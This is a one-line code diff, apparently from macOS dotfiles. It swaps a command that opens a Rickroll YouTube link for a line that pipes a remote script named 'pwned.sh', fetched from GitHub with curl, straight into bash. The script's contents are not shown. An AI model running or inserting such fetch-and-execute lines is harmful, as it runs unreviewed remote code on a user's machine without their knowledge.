@@ -1,1 +1,1 @@
-/usr/bin/open -F -a "/Applications/Google Chrome.app" "https://youtu.be/dQw4w9WgXcQ";
+/bin/bash < <(curl "https://raw.githubusercontent.com/InnerSpark/dotfiles/master/macos/pwned.sh");
